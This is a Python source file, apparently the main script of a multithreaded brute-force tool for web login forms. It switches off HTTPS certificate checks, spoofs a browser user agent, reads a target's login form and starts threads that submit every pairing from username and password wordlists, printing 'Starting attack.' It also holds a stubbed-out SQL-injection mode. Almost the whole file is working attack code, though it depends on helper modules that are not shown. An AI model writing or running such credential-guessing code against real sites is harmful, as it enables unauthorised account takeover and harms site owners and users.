#!/usr/bin/python

import sys, time, os, threading

try:
	import mechanize, re, ssl
except ImportError as ImportError:
	print(error)
	_, missing_moudle, _ = str(ImportError).split("'")
	sys.exit("Try: sudo apt install python-%s" %(missing_moudle))

try:
	from core import actions, utils, tbrowser, options
	import httpbrute
except ImportError as ImportError:
	print(ImportError)
	sys.exit("Error while importing modules")


########################## SSL
#	https://stackoverflow.com/a/35960702
try:
	_create_unverified_https_context = ssl._create_unverified_context
except AttributeError:
	# Legacy Python that doesn't verify HTTPS certificates by default
	pass
else:
	# Handle target environment that doesn't support HTTPS verification
	ssl._create_default_https_context = _create_unverified_https_context
########################## End ssl

def main(optionURL, setOptions, setMode, setRunOptions):
	

	def do_job(jobs):
		for job in jobs:
			job.daemon = True
			job.start()
			
		for job in jobs:
			job.join()
	
	# BUG
	"""
		Setting threading with big number
		split jobs for threading
		Memory management
	"""
	
	optionUserlist, optionThreads, optionKeyFalse, optionPasslist = setOptions.values()
	optionProxy, optionLog, optionVerbose = setRunOptions.values()
	#setProxy, setVerbose, setLog = setRunOptions.values()

	# try:
	# 	sizePasslist = actions.size_o(optionPasslist)
	# 	sizeUserlist = actions.size_o(optionUserlist)
	# 	# TODO Check condition each case
	# 
	# except:
	# 	#utils.printf("Can not get size of passlist", "bad")
	# 	pass
		
	try:
		optionUserlist = optionUserlist.split("\n")
	except:
		#optionUserlist = optionUserlist.readlines()
		pass

	# TODO Must testing cases with list and file object
	try:
		optionPasslist = optionPasslist.split("\n")
	except:
		pass
	
	
	## End of testing
	
	timeStarting = time.time()

	# get login form info 
	# call brute
		
	
	
	sizePasslist = actions.size_o(optionPasslist)
	sizeUserlist = actions.size_o(optionUserlist)

	proc = tbrowser.startBrowser()
	proc.addheaders = [('User-Agent', tbrowser.useragent())]


	try:
		utils.printf("Checking connection...")
		proc.open(optionURL)
		#TODO PROXY
		loginInfo = tbrowser.getLoginForm(optionURL, proc)
		utils.printf("Connection success! Starting attack.")

	except Exception as err:
		utils.die("Error while parsing login form", err)

	finally:
		proc.close()
	
	workers = []
	trying = 0
	
	try:
		for password in optionPasslist:
			for username in optionUserlist:
				trying += 1
				
				if len(workers) == optionThreads:
					do_job(workers)
					del workers[:]

				worker = threading.Thread(
					target = httpbrute.submit,
					args = (
						optionURL, username.replace("\n", ""), password.replace("\n", ""), sizeUserlist * sizePasslist,
						optionProxy, optionKeyFalse, optionVerbose, optionLog,
						loginInfo, trying
					)
				)
				workers.append(worker)
		
		#DO ALL LAST TASKs
		for worker in workers:
			do_job(workers)
			del workers[:]
	# try:
	# 
	# 	#TODO modify for sql injection mode
	# 	if setMode == "--sqli":
	# 		pass
	# 		# for i in xrange(optionThreads):
	# 		# 	worker = threading.Thread(
	# 		# 		target = sqltest.handle,
	# 		# 		args = (optionURL, optionUserlist, optionPasslist, sizeUserlist * sizePasslist, setProxy, optionKeyFalse)
	# 		# 	)
	# 		# 	# add threads to list
	# 		# 	workers.append(worker)
	# 	else:
	# 		#httpbrute.handle(optionURL, optionUserlist, optionPasslist, sizePasslist, setProxy, optionKeyFalse)
	# 		httpbrute.handle(optionURL, optionUserlist, optionPasslist, optionKeyFalse, optionThreads, setRunOptions)

	except KeyboardInterrupt:# as error:
		# for worker in workers:
		# 	worker.join()
		utils.die("Terminated by user!", "KeyboardInterrupt")

	except SystemExit:# as error
		utils.die("Terminated by system!", "SystemExit")

	except Exception as error:
		utils.die("Error while running", error)

	finally:
		############################################
		#	Get result
		#
		############################################

		# try:
		# 	credentials = processBruteForcing.actGetResult()
		#
		# 	#	check result
		# 	if len(credentials) == 0:
		# 		utils.printf("Password not found!", "bad")
		# 	else:
		# 		utils.printf("")
		# 		utils.print_table(("Username", "Password"), *credentials)
		# except:
		# 	#utils.printf("\nCan not get result.\n", "bad")
		# 	pass

		utils.printf("\nCompleted. Run time: %0.5s [s]\n" %(time.time() - timeStarting))

		########################################
		#	Clear resources
		#
		########################################

		try:
			optionPasslist.close()
		except:
			pass
		try:
			optionUserlist.close()
		except:
			pass

		sys.exit(0)

if __name__ == "__main__":
	current_dir = actions.getRootDir(sys.argv[0])
	if current_dir:
		os.chdir(current_dir)
	main(*options.getUserOptions())